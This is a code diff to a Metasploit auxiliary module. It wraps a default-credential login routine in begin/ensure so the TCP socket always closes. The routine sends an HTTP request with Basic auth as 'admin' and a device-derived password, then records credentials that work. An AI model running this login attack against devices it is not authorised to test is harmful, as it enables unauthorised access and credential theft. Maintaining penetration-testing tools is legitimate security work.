@@ -100,37 +100,39 @@ class MetasploitModule < Msf::Auxiliary
             }
         )
 
-        auth = Rex::Text.encode_base64("admin:#{last_six}")
+        begin
+          auth = Rex::Text.encode_base64("admin:#{last_six}")
 
-        http_data = "GET /#{auth_req_page} HTTP/1.1\r\n"
-        http_data << "Referer: http://#{ip}/#{index_page}\r\n"
-        http_data << "Authorization: Basic #{auth}\r\n\r\n"
+          http_data = "GET /#{auth_req_page} HTTP/1.1\r\n"
+          http_data << "Referer: http://#{ip}/#{index_page}\r\n"
+          http_data << "Authorization: Basic #{auth}\r\n\r\n"
 
-        tcp.put(http_data)
-        data = tcp.recv(12)
+          tcp.put(http_data)
+          data = tcp.recv(12)
 
-        response = "#{data[9..11]}"
+          response = "#{data[9..11]}"
 
-        case response
-        when "200"
-          print_good("#{rhost}:#{datastore['HTTPPORT']} logged in as: admin/#{last_six}")
-          report_cred(
-            ip: rhost,
-            port: datastore['HTTPPORT'],
-            service_name: 'http',
-            user: 'admin',
-            password: last_six,
-            proof: response.inspect
-          )
-        when "401"
-          print_error("Default credentials failed")
-        when "404"
-          print_status("Page not found, try credential manually: admin/#{last_six}")
-        else
-          print_status("Unexpected message")
+          case response
+          when "200"
+            print_good("#{rhost}:#{datastore['HTTPPORT']} logged in as: admin/#{last_six}")
+            report_cred(
+              ip: rhost,
+              port: datastore['HTTPPORT'],
+              service_name: 'http',
+              user: 'admin',
+              password: last_six,
+              proof: response.inspect
+            )
+          when "401"
+            print_error("Default credentials failed")
+          when "404"
+            print_status("Page not found, try credential manually: admin/#{last_six}")
+          else
+            print_status("Unexpected message")
+          end
+        ensure
+          tcp.close
         end
-
-        tcp.close
       end
     end
 
